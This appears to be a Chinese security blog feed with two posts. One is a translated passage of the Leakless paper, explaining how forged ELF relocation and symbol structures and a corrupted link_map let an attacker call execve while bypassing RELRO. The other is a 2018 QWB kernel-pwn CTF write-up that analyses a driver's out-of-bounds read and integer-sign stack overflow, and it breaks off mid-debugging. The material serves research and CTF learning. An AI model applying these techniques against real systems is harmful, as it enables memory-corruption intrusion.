[33]。</p><p>ELF是Unix类平台(包括GNU/Linux与FreeBSD)上一种普遍的一种标准格式，其定义独立于任何一种特定动态装载器实现。因为Leakless主要依赖于ELF标准的特性，它也很容易应用于很多系统。</p><p><strong>3.1 ELF对象</strong></p><p>一个应用由一个主要ELF二进制文件(可执行文件)和数个动态库构成，它们都是ELF格式。每个ELF对象由多个segments组成，每个segment则含有一个或多个sections(译注：以下称sections为段)。</p><p>每个段都有约定的含义。举个例子，.text段包含着程序的代码，.data段包含着它可写的数据(例如全局变量)，而.rodata段则包含着只读的数据(例如常量和字符串)。段的列表以数组的形式存在于ELF文件的Elf_Shdr结构体中。</p><p>注意这里有两种ELF结构体的版本：一种是32位的(例如Elf32_Rel)，一种是64位的(例如Elf64_Rel)。为了简化起见，除了在相关讨论的特定案例中，一般情况我们将忽略这些细节。</p><p><strong>3.2 动态符号与重定位</strong></p><p>在这一节中，我们将对ELF符号解析过程相关的数据结构进行一个总结。图一总体展示了这些数据结构以及它们之间的关系。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13299369785/0" alt="image-20210317205600388"></p><p>figure 1：在符号解析过程中相关数据结构的关系(除去符号版本)。阴影背景部分表示只读内存。</p><p>一个ELF对象可以向其他ELF对象导出符号或导入符号。一个符号表示一个具有名称表示的函数或者全局变量。</p><p>每个符号都使用ELF_Sym结构体来描述。这个结构体的实例是ELF中.dynsym段的组成部分，它包含以下的相关的域：</p><p>[st_name] 相对.dynstr段开始的偏移值，那里有这个符号名字的字符串。</p><p>[st_value] 如果这个符号被导出，则存有这个导出函数的虚拟地址，否则为NULL。</p><p>这些结构被用来解析导入的符号。导入符号的解析需要重定位的支持，重定位项以Elf_Rel结构体来描述。这个结构的实例存在于.rel.plt段(用于导入函数)和.rel.dyn段中(用于导入全局变量)。在这里我们感兴趣的是前者。Elf_Rel结构体有以下域：</p><p>[r_info] 此域的高位3个字节作为一个无符号的下标，表示这个符号在.dynsym段中的位置。</p><p>[r_offset] 解析后的符号地址被写入内存中的位置(绝对地址)。</p><p>当程序导入一个正常函数时，链接器会在.dynstr段中包含一个函数名称的字符串，在.dynsym段中包含一个指向它的符号(Elf_Sym)，在.rel.plt段中包含一个指向这个符号的重定位项(Elf_Rel)。</p><p>重定位的目标(即Elf_Rel结构中的r_offset域)将会是全局偏移量表(Global Offset Table，GOT)中的一个条目。GOT表保存于.got.plt段，由能够解析.rel.plt段中的重定位的动态链接器来填写。</p><p><strong>3.3 惰性符号解析</strong></p><p>因为在程序开始时就解析所有导入符号并应用重定位是一项开销较大的操作，符号的解析将是惰性的。在惰性符号解析中，每个函数地址(相当于GOT中的条目)只在需要的时候才进行解析(即这个函数第一次被调用的时候)。</p><p>当一个程序需要调用导入函数时，他将会调用链接表(Procedure Linkage Table，.plt段)中的一段特定代码。就像列表1展示的那样，每个导入函数在PLT中有一段特定代码，其执行无条件跳转到相关的GOT条目。</p><p>在符号解析结束后，GOT条目已经包含了实际函数的地址，所以执行能够无缝地进入导入的库中。当函数返回时，控制流返回到PLT中特定代码的调用者位置，故剩下的PLT代码不会被执行。不过，当程序刚启动时，GOT条目被初始化为一个指向相关PLT代码第2条指令的地址。这部分代码将会导入函数的标识(以一个Elf_Rel实例在.rel.plt段中偏移的形式)压栈，然后跳到.plt段开头PLT0的代码处。这回，PLT0的代码，将GOT[1]的值压栈并间接跳转至GOT[2]。这两个GOT表的条目有着特殊的含义，动态装载器在开始时给他们填充了特殊的内容：</p><p>-GOT[1].一个指向内部数据结构的指针，类型是link_map，在动态装载器内部使用，包含了进行符号解析需要的当前ELF对象的信息。</p><p>-GOT[2].一个指向动态装载器中_dl_runtime_resolve函数的指针。</p><p>总的来说，PLT条目只是进行了以下函数调用：</p><p>_dl_runtime_resolve(link_map_obj，reloc_index)</p><p>这个函数使用link_map_obj参数来取得解析导入函数(使用reloc_index参数标识)需要的信息，并将结果写到正确的GOT条目中。在_dl_runtime_resolve解析完成导入符号中，控制流就交到了那个函数手中，使得解析过程对调用者来说完全透明。下次PLT代码调用时则会直接进入目标函数执行。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13299415823/0" alt="image-20210317210423265"></p><p>Listing 1：PLT与GOT的例子</p><p>link_map结构体包含了动态装载器加载ELF对象需要的全部信息。每个link_map实例都是一条双向链表的一个节点，而这个链表保存了所有加载的ELF对象的信息。</p><p><strong>3.4 符号版本</strong></p><p>ELF标准提供了一个可以导入一个特定版本符号的机能。这个特性被用于从一个特定的库中导入函数。例如，使用版本标识GLIBC_2.2.5，就可以从2.2.5版本的GNU C标准库中导入fopen这个C标准库函数。.gnu.version_r段保存了版本的定义，形式是Elf_Verdef结构体。</p><p>一个动态符号与指向它的Elf_Verdef的关联保存在.gnu.version段中，其中有一个Elf_Verneed结构体组成的数组，每个元素对应动态符号表中的一项。这个结构体只有一个域：一个16位的整数，表示.gnu.version_r段中的下标。</p><p>得益于这样的布局，动态链接器使用Elf_Rel结构体成员r_info中的下标同时作为.dynsym段和.gnu.version段的下标。理解这一过程非常重要，因为Leakless之后将被它所扰。</p><p><strong>3.5 .dynamic段和RELRO</strong></p><p>动态装载器从.dynamic段收集所有它需要的关于ELF对象的信息。.dynamic段由Elf_Dyn结构组成，一个Elf_Dyn是一个键值对，其中存储了不同类型的信息。相关的条目已经在表1中展示，它们保存着特定段的绝对地址。有一个例外是DT_DEBUG条目，它保存的动态装载器内部数据结构的指针。这个条目是为了调试的需要由动态装载器初始化的。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13299489556/0" alt="image-20210317211920785"></p><p>Table 1：.dynamic段的条目，d_tag是键，d_value是值。</p><p>一个攻击者如果能干扰这些值，那将会造成安全威胁。为此，一种称作RELRO(重定位只读 RELocation Read Only)保护机制被引入了动态装载器。RELRO有两种形式：部分和完全。</p><p>[部分RELRO] 在这种模式下，一些段(包括.dynamic)在初始化后将会被标识为只读。</p><p>[完全RELRO] 除了部分RELRO，惰性解析会被禁用：所有的导入符号将在开始时被解析，.got.plt段会被完全初始化为目标函数的最终地址，并被标记为只读。此外，既然惰性解析被禁用，GOT[1]与GOT[2]条目将不会被初始化为之前在3.3节中提到的值。</p><p>可以看到，RELRO显著地增加了复杂性，Leakless为了能在这些对抗措施下工作，必须解决这个问题(它也做到了)。</p><p>值得注意的是之前提到的link_map结构出于内部用途考虑，在I_info域中保存了.dynamic段中大多数条目的指针构成的一个数组。既然动态装载器完全地信任这个域的内容，那么Leakless将有能力巧用这个结构达成自己的目的。</p><p>==================================================================================</p><p><strong>4. 攻击</strong></p><p>Leakless使攻击者只用名字就能够调用任意库函数，不需要关于内存布局以及漏洞程序库的信息。为了达到这个目标，Leakless活用了动态装载器，强迫其解析请求的函数。由于它和内存破坏漏洞的破坏性有着同样的根源：可控数据和不可控数据的混杂，所以这样的攻击同样可能。在栈溢出的攻击案例中，可控数据的问题就出在保存的返回地址上。对于动态装载器来说，可控数据就是众多用于符号解析的数据结构。特别地，函数的名字，保存在.dynstr段中，与返回地址相似：当函数被调用，它也指定了一个特定的指向目标。</p><p>动态装载器认为它接受到的参数都是值得信任的，因为它假设这些都是直接由ELF文件提供的或者它自己在开始时初始化的。然而，当一个攻击者能够修改这些数据时，这个假设就不成立了。一些动态装载器(FreeBSD)会验证自己接收到的输入。然而，他们还是完全地信任控制结构，但这些也会被Leakless轻易地破坏。</p><p>Leakless被设计用于利用一个存在的漏洞(指缓冲区溢出等)。Leakless的输入包括可执行ELF文件，一组ROP Gadgets的集合，和攻击者希望调用的库函数名称(典型的例子就是execve())。有了这些信息，Leakless输出了一段ROP的攻击载荷(payload)能够执行需要的库函数，且能够绕过多种应用在二进制文件上的加固技术。这段ROP链通常来说非常短：依赖于二进制文件中的减缓技术，需要3到12此不等的写操作。一些Leakless产生的输出的例子能够在Leakless代码库的文档里找到 [17]。</p><p>Leakless不需要任何关于库地址和内容的信息；我们假设ASLR在所有的动态库上启用且不能获得关于它们的任何知识。然而，我们需要假设可执行文件不是”位置无关的”，所以它们会被加载到内存中的特定位置。我们在7.2节中讨论了这个限制，并且在6.2节中展示了位置无关可执行(Position Independent Executables，PIE)文件在现代操作系统中的分布情况。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13299634941/0" alt="image-20210317215119814"></p><p>Figure 2：攻击图示。阴影背景表示只读的内存，白色背景表示可写的内存，红色或加粗的部分表示攻击者伪造的数据</p><p>a) 4.1节中攻击的例子。攻击者能够改写DT_STRTAB条目的内容，欺骗动态装载器使其认为.dynstr段在.bss段中，并在那里伪造一个假的字符串表。当动态装载器尝试解析printf时将会使用不同的基地址来寻找函数的名称，最终实际会解析并执行execve。</p><p>b) 4.2节中攻击的例子。传递给_dl_runtime_resolve的参数reloc_index超出了.rel.plt段并最终落在.bss段，在那里攻击者伪造了Elf_Rel结构。这个重定位项指向一个就位于其后的Elf_Sym结构，而Elf_Sym结构中的index同样超出了.dynsym段。这样这个符号就会包含一个相对.dynstr地址足够大的偏移使其能够达到这个符号之后的一段内存，那里保存着这个将要调用的函数的名称。</p><p>在多数情况下，Leakless并不依赖目标系统上允许的动态装载器的实现和版本，不过有些攻击需要一些小的改动以适应不同的动态装载器的实现。</p><p>值得注意的是Leakless的目标，即获得一个库函数的地址并指向它，于libdl库中的dlsym函数十分相似。但在实际当中这个函数很少被应用程序使用，所以，它的地址一般攻击者也不知道。</p><p><strong>4.1 基础情形</strong></p><p>就像第3节于图1中展示的那样，动态装载器从.rel.plt中的Elf_Rel结构开始工作，顺着其中的下标找到.dynsym段中对应的Elf_Sym结构的位置，并最终使用它确定待解析符号的名称(在.dynstr段中的一段字符串)。最简单的调用任意函数的办法就是使用希望的函数名称覆盖字符串表中的条目，然后再调用动态装载器，但这是不可能的，因为保存着动态符号字符串表的段，即.dynstr，是不可写的。</p><p>然而，动态装载器是从.dynamic段的DT_STRTAB条目中获得.dynstr段的地址的，而且DT_STRTAB条目的位置是已知的，默认情况下也可写。这样，就像图2a中展示的那样，我们可以将这个条目的d_val域覆盖为一个指向攻击者控制内存区域的指针(典型的就是.bss或.data段)。这块内存区域上将会包含一个字符串，比如execve。到了这一步，攻击者需要选择一个已经存在的符号，它的偏移在伪造的字符串表中正好指向execve的位置，接着调用其对应的符号解析重定位过程。可以通过将其重定位项的偏移压栈并跳转到PLT0实现。</p><p>这种方式非常简单，但仅当二进制程序的.dynamic段可写时有效。对于部分使用或者完全RELRO编译的二进制程序，需要使用更复杂的攻击。</p><p><strong>4.2 绕过部分RELRO</strong></p><p>就像我们在3.3节中解释的那样，_dl_runtime_resolve函数的第二个参数是Elf_Rel条目在重定位表(.rel.plt段)中对应当前请求函数的偏移。动态装载器将这个值加上.rel.plt的基地址来得到目标Elf_Rel结构的绝对地址。然而多数动态装载器实现不去检查重定位表的边界。这就表明如果一个大于.rel.plt的值传到 _dl_runtime_resolve中，装载器将会认为特定的地址上的数据是一个Elf_Rel结构并使用它，即使那里已经超出了.rel.plt段的范围。</p><p>就像图2b显示的那样，Leakless计算一个能够将_dl_runtime_resolve导向到攻击者控制的内存空间的下标值。然后它制造一个Elf_Rel结构，并填写r_offset的值为一个可写的内存地址来将解析后的函数地址写在那里。同理，r_info的值将会是一个将动态装载器导向到攻击者控制内存的下标。Leakless会将一个伪造的Elf_Sym对象放在那个下标对应的位置，其中的st_name域，这个值也大到足以达到攻击者控制的内存。在这段内存最后，Leakless会放置将要执行的函数的名称。</p><p>总之，Leakless将这一条符号解析过程中需要使用的结构链全部都伪造了出来，完全控制了对于攻击者控制内存中内容的”函数调用的过程” 。在这之后，Leakless将计算好的假Elf_Rel结构的偏移压栈，并调用PLT0代码。</p><p>然而，这个方法会受到几个限制。首先Elf_Rel的下标需要是整数，因为r_info域在ELF标准中规定是一个无符号整数。这就意味着在实际中这块可写的内存空间(例如.bss段)必须是位于.dynsym段之后。在我们的评估中，情况总是满足的。</p><p>另一个限制是ELF会使用在3.4节中提到的符号版本系统。在这种情况下，Elf_Rel.r_info域不仅用作动态符号表中的下标，也用作符号版本表(.gnu.version段)中的下标。通常来说，Leakless能够自动的满足这些限制，除了x86-64中使用huge pages的小型二进制程序 [32]。我们在附录A中详述了关于符号版本的额外限制。当这些限制不能被满足时，必须使用一个替代的方法。这就需要活用动态装载器，通过破坏其内部数据结构来改变动态解析的过程。</p><p><strong>4.3 破坏动态装载数据</strong></p><p>我们会想起_dl_runtime_resolve的第一个参数是一个指向link_map数据类型的指针。这个结构体，包含了ELF可执行文件的信息，而且这些内容会被动态装载器完全地信任。此外，Leakless可以获得有漏洞程序的GOT表的第二个条目，它的位置是确定已知的。</p><p>回想3.5节中link_map的结构，在I_info域中，包含着.dynamic段所有条目指针构成的一个数组。这些指针就是动态链接器拿来定位符号解析过程中使用的对象的。就像图3中显示的那样，通过覆盖这个数据结构的一部分，Leakless能够将I_info域中的DT_STRTAB条目指向一个特意制造的动态条目，那里指向一个假的动态字符串表。结果，攻击者就可以将攻击简化为4.1节中的基础情形了。</p><p>这个技术较上一节中的技术而言有着更加广泛的适用性，因为它没有特定的限制。特别的，它对于使用huge pages的小型64位ELF同样适用。然而，相比于之前只依赖于标准ELF的特性的攻击，在这种情况(和下一节要叙述的情况)下，我们需要假设特定glibc的结构(link_map)布局是已知的。每个动态装载器有它自己的结构实现，故当面对不同的动态装载器时就需要做一些小的改动。需要注意的是link_map的布局在同一种动态装载器的不同版本之间也可能不同。然而，他们显得非常稳定，尤其是glibc中的相关结构从2004年起就没变过。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13303009978/0" alt="image-20210318172320228"></p><p>Figure 3：4.3节中攻击的例子。攻击者通过解引用GOT的第二项来取得link_map结构。在这个结构中破坏保存DT_STRTAB指针的I_info域。它的值被设为一个伪造的动态条目的地址，那里指向了一个位于.bss段中的假的动态字符串表。</p><p><strong>4.4 完全RELRO的情形</strong></p><p>Leakless可以绕过完全RELRO的保护。</p><p>当完全RELRO应用时，所有的重定位将在加载时完成，不会有惰性解析的过程，并且link_map结构的地址和在GOT中的_dl_runtime_resolve也不会被初始化。所以，像普通技术绕过部分RELRO那样直接获得它们的地址是不可能的。然而，从动态表的DT_DEBUG条目中间接恢复这两个值仍然是可能的。DT_DEBUG条目的值是动态装载器在加载时设置好的，它指向一个r_debug类型的数据结构。这个数据结构保存着调试器用来标识动态装载器的基地址并拦截相应事件需要的信息。此外，这个结构的r_map域保存着一个指向link_map链表头部的指针。</p><p>Leakless破坏了这个链表中描述ELF可执行文件的第一个节点，使得用于保存DT_STRTAB的I_info条目指向一个假的动态字符串表的指针。具体情形如图4所示。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13303168289/0" alt="image-20210318174657414"></p><p>Figure 4：4.4节中的攻击图示。阴影背景表示只读的内存，白色的背景表示可写的内存，红色与加粗的部分表示攻击者伪造的数据。攻击者使用DT_DEBUG这个动态条目来获取r_debug结构，接着，解引用r_map域从而得到主程序的link_map结构，然后像第3节中展示的那样破坏I_info[DT_STRTAB]。因为完全RELRO的缘故.got.plt是只读的，攻击者需要伪造一个重定位项。为此，他破坏I_info[DT_JMPREL]使其指向一个假的动态条目，而这个动态条目则指向一个重定位项。这个重定位项引用了一个已经存在的printf符号，但r_offset则指向一块可写的内存区域。</p><p>接着攻击者同样需要恢复_dl_runtime_resolve函数的指针，因为完全RELRO现在它在主程序的GOT中已经不存在了，所以他解引用I_info域中的第一个link_map结构取得描述第一个共享库的link_map，而这个共享库是不被完全RELRO保护的。攻击者通过I_info[DT_PLTGOT]域来得到对应的动态条目(右侧的.dynamic)，接着是.plt.got段(总是在右侧)，其中的第二个条目里就有 _dl_runtime_resolve的地址。</p><p>在这之后，Leakless必须调用_dl_runtime_resolve，将刚刚破坏的link_map结构作为第一个参数传过去，并将一个新的.dynsym偏移作为第二个参数传过去。然而，就像之前提到的那样， _dl_runtime_resolve因为完全RELRO的缘故在GOT中已经不存在了。所以，Leakless必须在另一个ELF对象的GOT表中找到它的地址，换句话说，就是一个被程序使用而没有完全RELRO保护的库。在大多数情况下，只有ELF可执行文件本身是被完全RELRO保护的，但库并不会。这是因为RELRO是在牺牲性能的前提下，用来加固一些被认为比较”有风险”的特定应用程序的。在共享库上应用完全RELRO将会影响所有使用这个库应用程序的性能，所以库文件一般是不受保护的。因为各个库在链表上的顺序是确定的，Leakless可以解引用link_map中的I_next项来得到不被完全RELRO保护的库文件的link_map，解引用它的I_info项得到对应的DT_PLTGOT动态条目的值，再解引用它的值(即这个库GOT的基地址)，就可以从GOT中获得 _dl_runtime_resolve的地址了。</p><p>Leakless接下来必须要克服以下问题：_dl_runtime_resolve不仅仅会调用目标函数，还会尝试将它的地址写到正确的GOT项中。如果这件事发生，程序就会崩溃，因为完全RELRO保护下GOT是不可写的。我们可以通过伪造link_map中的DT_JMPREL动态条目来绕过这个问题。原本DT_JMPREL指向.rel.dyn段，Leakless将其指向攻击者控制的一块内存区域，那里写有一个Elf_Rel结构，且其r_offset域指向一块可写的内存区域，其r_info指向我们的目标符号。所以，当一个库被解析的时候，它的地址将会被写到一个可写的位置，程序就不会崩溃了，而且请求的函数也将会被执行。</p><p>==================================================================================</p><p><strong>5. 实现</strong></p><p>Leakless将会分析二进制文件以确定它的技术是否适用，接着制造必要的数据，然后生成一段ROP链来实现所选的技术。至于发现最初始的漏洞以及自动提取有用的gadgets那并非我们的工作，它们已经在很多著作中被很好地研究和实现过了[6,16,19,20,34,38]。我们将Leakless设计成与多种gadget发现技术兼容，并实现了一个手动的后端(用户可以给程序提供gadgets)，另外还有一个使用ROPC [22] 的后端。ROPC是一个以Q [34] 提出的方法为基础实现的一个自动化ROP编译器的原型。</p><p>我们还开发了一个小型的测试套件，由一个具有基于栈的缓冲区溢出的C程序组成，同时提供无保护，部分RELRO和完全RELRO的版本。这个测试套件可以在x86，x86-64，arm架构的GNU/Linux系统和x86-64架构的FreeBSD系统上运行。</p><p><strong>5.1 需要的Gadgets</strong></p><p>Leakless包含了4种用于不同加固措施的利用技术。应用这些不同的技术需要提供不同的gadgets。表2是对这些gadgets类型的一个总结。write_memory gadget主要用于在已知地址伪造数据结构，deref_write gadget用于遍历和破坏数据结构(尤其是link_map)。deref_save和copy_to_stack gadgets是用于在完全RELRO的情况中的。前者的目的是将link_map和_dl_runtime_resolve的地址保存在一个已知位置，而后者的则是用来将link_map和重定位项的下标放到栈上然后调用 _dl_runtime_resolve，因为使用PLT0已经不可行。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13352984082/0" alt="image-20210330101743455"></p><p>Table 2：多种方法需要的Gadgets。”Signature”列代表gadget的名字和它接受的参数，”Implementation”代表gadget行为的类C伪代码。最后四列指示了某个gadget是否在第四节里对应的方法中需要。”N”表示没有RELRO，”H”表示部分RELRO且为使用huge pages的小型64位程序，”F”则表示完全RELRO。</p><p>对于感兴趣的读者，我们提供了Leakless在两组不同的缓解技术保护下进行利用的深度样例，放在Leakless代码库的文档中 [17]。</p><p>==================================================================================</p><p><strong>6.评估</strong></p><p>我们使用4种方法对Leakless进行了评估。首先我们确定了我们的技术对于不同动态装载器实现的适用性。接着分析了多个流行的GNU/Linux以及BSD的发行版(Ubuntu，Debian，Fedora和FreeBSD)中的二进制文件，从而确定易受我们攻击影响的二进制文件所占的比率。然后我们将Leakless应用在对真实世界中Wireshark的一个有漏洞版本的利用中，以及一个针对Pidgin的更加复杂的攻击中。最后我们使用一个图灵完全的ROP编译器来实现Leakless的方法和两个以前使用的技术，并比较他们生成出的链的大小。</p><p><strong>6.1 动态装载器</strong></p><p>为了展示Leakless的普适性，尤其是针对不同的基于ELF的平台，我们调查了几种动态装载器的实现。特别地，我们发现GNU C标准库(也就是GNU/Linux发行版中广泛使用的glibc)的动态装载部分，其他一些Linux实现例如dietlibc，uClibc和newlib(在嵌入式系统中广泛使用)，以及OpenBSD和NetBSD的实现都含有可以被Leakless利用的漏洞。另一种嵌入式库，musl，则不会受到我们方法的影响因为它不支持惰性装载。Bionic，Android中使用的C标准库，同样不可利用，因为它只支持PIE的二进制文件。最有趣的例子，不同于所有我们分析的装载器，是FreeBSD的实现。实际上，它是唯一一个会对传进_dl_runtime_reslove的参数进行边界检查的。所有其他的装载器完全信任传入的参数。不仅如此，所有被分析的装载器都完全地信任控制结构，而Leakless会在多数攻击中破坏这个结构。</p><p>总结来说，在我们分析的装载器中，只有2哥在设计上对Leakless是免疫的：musl，它不支持惰性符号解析；以及bionic，它只支持PIE可执行文件。此外，因为FreeBSD的动态装载器会进行边界检查，4.2节中的技术已经不适用了。不过其他的技术还是可以起效。</p><p><strong>6.2 操作系统调研</strong></p><p>为了能明白Leakless对真实世界的操作系统的影响，我们对几个Linux和BSD发行版中默认安装的二进制程序进行了一次调研。特别地，我们检查了所有在/sbin，/bin，/usr/bin和/usr/bin目录下的程序，并将它们按照Leakless技术的适用性进行分类。我们考虑的发行版有Ubuntu 14.10，Debian Wheezy，Fedora 20，和FreeBSD 10。我们同时使用了这些系统的x86和x86-64的版本。在Ubuntu和Debian上，我们另外安装了LAMP(Linux，Apache，MySQL，PHP)栈作为模拟一个典型服务器部署、配置的尝试。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;作者：Alessandro Di Federico, Amat Cama, Yan Shoshitaishvili, Christopher Kruegel and Giovanni Vigna(UCSB,CA, USA; Politecnico di Milano, Mi
      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="ELF" scheme="https://billyotry.github.io/tags/ELF/"/>
    
  </entry>
  
  <entry>
    <title>【Kernel Pwn】2018QWB core</title>
    <link href="https://billyotry.github.io/2021/03/06/%E3%80%90Kernel%20Pwn%E3%80%912018QWB%20core/"/>
    <id>https://billyotry.github.io/2021/03/06/%E3%80%90Kernel%20Pwn%E3%80%912018QWB%20core/</id>
    <published>2021-03-06T06:09:03.108Z</published>
    <updated>2021-03-17T04:11:59.112Z</updated>
    
    <content type="html"><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>首先到手几个文件</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247549408/0" alt="image-20210306142520926"></p><p>解压出文件系统后发现里面有个shell脚本<code>gen_cpio.sh</code>来生成<code>core.cpio</code>，每次我们修改了内核的启动<code>init</code>后我们就要重新打包一份<code>core.cpio</code>，我们可以直接将他写进我们的启动脚本里面</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">cd core</span><br><span class="line">./gen_cpio.sh core.cpio</span><br><span class="line">mv core.cpio ../core.cpio</span><br><span class="line">cd ..</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &#x27;console=ttyS0 root=/dev/ram rw oops=panic panic=1 quiet kaslr&#x27; \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-gdb tcp::123 \</span><br><span class="line">-nographic \</span><br></pre></td></tr></table></figure><p>接着观察下<code>init</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">poweroff -d 120 -f &amp; 定时关机</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">echo &#x27;sh end!\n&#x27;</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure><p>由于存在<code>echo 1 &gt; /proc/sys/kernel/kptr_restrict</code>，导致我们无法在非root权限下查看<code>/proc/kallsyms</code>，也就是符号地址，但是它已经⽤ <code>cat /proc/kallsyms &gt; /tmp/kallsyms</code> ，也可以通过 <code>/tmp/kallsyms</code> 读到符号地址。</p><p>这里我们将定时关机注释掉，并且将1000改0为，以便在启动后直接在root权限下，方便操作。注意到<code>insmod /core.ko</code>，这个就是我们加载的驱动，一般来说漏洞就在这里面，是我们分析的主要目标。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>分析core.ko</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247652132/0" alt="image-20210306144902690"></p><p>发现是开了NX和Canary，然后内核是开了kaslr。</p><p>在core.ko驱动中主要实现了几个函数。</p><p><strong>init_module</strong></p><p>模块一加载就会先执行这个函数，<code>proc_create</code>会创建一个PROC entry，用户可以通过对文件系统中的该文件，和内核进行数据的交互。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct proc_dir_entry *<span class="title">proc_create</span><span class="params">(    </span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">umode_t</span> mode, struct proc_dir_entry *parent,    </span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">const</span> struct file_operations *proc_fops)</span> </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line"><span class="keyword">return</span> proc_create_data(name, mode, parent, proc_fops, <span class="literal">NULL</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单介绍下参数：</p><ul><li>name：名字</li><li>mode：文件模式</li><li>parent：父entry，为0的话，默认父entry是/proc</li><li>proc_fops：操作函数表</li></ul><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247685830/0" alt="image-20210306145759918"></p><p>然后我们看proc_fops：回调函数表，是个data段的变量</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">core_fops       </span><br><span class="line">offset:0dq offset __this_module </span><br><span class="line">offset:18dq offset core_write </span><br><span class="line">offset:48dq offset core_ioctl </span><br><span class="line">offset:78dq offset core_release</span><br></pre></td></tr></table></figure><p>代表了我们可以进行的操作</p><p><strong>core_ioctl</strong></p><p>就是通过不同的cmd调用不同的函数的功能</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247740445/0" alt="image-20210306150911596"></p><p><strong>case：0x6677889C：</strong>通过第三个参数可以控制<code>off</code>的值，这个值在<code>core_read</code>函数中有用到。</p><p><strong>case：0x6677889B：</strong>调用<code>core_read</code>函数。其中主要是调用<code>copy_to_user</code>将内核中的数据拷贝到用户空间中，并且偏移通过<code>off</code>来计算，也就是我们可以控制<code>off</code>来达到越界读取的功能。这里我们就可以用来泄露<code>canary</code>。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247784577/0" alt="image-20210306152019523"></p><p><strong>case：0x6677889A：</strong>调用<code>core_copy_func</code>函数。主要是把bss段上a1个字节拷贝到v2上，然后v2是栈上的一个变量，这里就可以实现我们的栈溢出，并且我们可以看到a1在判断大小的时候是<code>int</code>类型，判断完进行拷贝操作的时候变成了无符号类型，那么我们就可以负数溢出，传入一个负数来绕过大小check。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247805369/0" alt="image-20210306152513125"></p><p>这里还有一个重要的点就是<code>qmemcpy</code>函数在进行拷贝的时候只使用最后面两个字节（如使 ⽤ 0xffffffff00000000 | 0x0100 实现的是拷⻉0x100字节）。</p><p><strong>core_write</strong></p><p>这个函数没有在<code>ioctl</code>中调用，我们可以直接通过<code>write</code>系统调用来调用，因为他肯定是和<code>write</code>事件绑定。</p><p>主要的功能就是从用户态拷贝<code>size</code>个字节到<code>name</code>变量中，这里的name变量在前面<code>core_copy_func</code>有调用，也就是我们可以先调用<code>core_write</code>将我们的数据拷贝到<code>name</code>中，在调用<code>core_copy_func</code>函数将name中的数据拷贝到<code>v2</code>变量中，如果够长就能够覆盖掉返回地址。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247835898/0" alt="image-20210306153230627"></p><p><strong>core_release</strong></p><p>打印一句话退出</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247836217/0" alt="image-20210306153235905"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>这里我们利用内核空间ROP来操作。因为没有SMEP保护，也可以re2usr。</p><p>首先我们就是要先泄露出canary，和一些有用的真实内核地址</p><p>这里我们进行调试，还记得我们之前将内核的启动init中1000改为了0后</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247874416/0" alt="image-20210306153942525"></p><p>然后我们在gdb启动后</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247878080/0" alt="image-20210306154033673"></p><p>然后我们在<code>core_read</code>函数中下断点</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247893018/0" alt="image-20210306154410011"></p><p>执行到这里，此时canary以及放入到栈中，我们查看以下栈空间</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13247898480/0" 